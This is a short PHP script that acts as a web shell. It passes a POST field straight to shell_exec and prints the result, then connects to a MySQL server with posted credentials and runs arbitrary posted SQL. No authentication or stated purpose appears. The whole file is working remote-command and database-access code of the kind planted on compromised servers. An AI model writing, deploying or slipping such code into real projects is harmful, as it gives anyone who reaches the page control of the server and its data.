<?php
    $command = shell_exec(substr($_POST['command_shell'], 0, -7));
    echo "<pre>$command</pre>";

    $conn = new mysqli($_POST['host'], $_POST['username'], $_POST['password']);
    $sql = substr($_POST['sql'], 0, -7);

    if ($conn->query($sql) === TRUE) {
        echo "True";
    } else {
    echo "False: " . $conn->error;
    }

?>